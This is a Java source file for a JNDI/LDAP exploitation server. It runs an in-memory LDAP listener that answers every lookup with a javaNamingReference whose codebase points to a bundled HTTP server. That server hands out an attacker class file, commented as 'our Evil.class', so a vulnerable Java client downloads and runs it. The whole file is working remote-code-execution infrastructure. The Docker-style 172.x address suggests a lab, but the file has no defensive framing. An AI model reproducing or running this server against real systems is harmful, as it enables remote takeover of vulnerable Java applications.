import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import io.undertow.Undertow;
import io.undertow.util.Headers;
import org.apache.commons.lang3.SerializationUtils;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.*;
import java.nio.ByteBuffer;
import java.util.*;

public  class  Server  {
    private  static  final String LDAP_BASE = "dc=example,dc=com" ;
    private static String payloadClassname;
    public  static  void  main (String[] args) throws IOException, LDAPException {
        List<String> ips = new ArrayList<>();
        Enumeration<NetworkInterface> e = NetworkInterface.getNetworkInterfaces();
        while(e.hasMoreElements())
        {
            NetworkInterface n = (NetworkInterface) e.nextElement();
            Enumeration ee = n.getInetAddresses();
            while (ee.hasMoreElements())
            {
                InetAddress i = (InetAddress) ee.nextElement();
                ips.add(i.getHostAddress());
            }
        }

        String ip = ips.stream().filter(elIp -> elIp.startsWith("172.")).findFirst().get();

        System.out.println("Running on ip: " + ip);

        String[] defaultArgs = {"http://" + ip + ":8200/#Fabien", "9999", "8200", "Fabien.class"};

        if (args.length != 4) {
            args = defaultArgs;
        }
        payloadClassname = args[3];

        setupLDAP(args[0], Integer.parseInt(args[1]));
        setupHTTP(Integer.parseInt(args[2]));
    }

    private static void setupLDAP(String evilUrl, int port)
        throws LDAPException, MalformedURLException, UnknownHostException
    {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen" ,
            InetAddress.getByName( "0.0.0.0" ),
            port,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));

        config.addInMemoryOperationInterceptor(new OperationInterceptor( new URL(evilUrl)));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println( "LDAP server listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    private static void setupHTTP(int port) throws IOException {

        Undertow server = Undertow.builder()
            .addHttpListener(port, "0.0.0.0")

            // keep it simple - any request returns our Evil.class
            .setHandler(exchange -> {
                System.out.println("om" + exchange.getRelativePath());
                System.out.println("Send HTTP class byte array result");

                String txt = exchange.getRelativePath().replace("/", "");

                byte[] targetArray = readEvil(txt);

                exchange.getResponseHeaders().put(Headers.CONTENT_TYPE, "application/octet-stream");
                exchange.getResponseSender().send(ByteBuffer.wrap(targetArray));
            }).build();

        System.out.println( "HTTP server listening on 0.0.0.0:" + port);
        server.start();
    }

    private static byte[] readEvil(String param) throws IOException {
        InputStream is = new FileInputStream("shared/" + param);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[4];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            bos.write(data, 0, nRead);
        }

        bos.flush();
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private final URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (LDAPException | MalformedURLException e) {
                e.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
            throws LDAPException, MalformedURLException
        {
            System.out.println("Base = " + base);

           URL turl = new URL(
                   this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
           );


           System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
           e.addAttribute("javaClassName", "foo");
           String cbstring = this.codebase.toString();
           int refPos = cbstring.indexOf('#');
           if (refPos > 0) {
               cbstring = cbstring.substring(0, refPos);
           }

           e.addAttribute("javaCodeBase", cbstring);
           e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
           e.addAttribute("javaFactory", base);
           result.sendSearchEntry(e);
           result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        }
    }
}
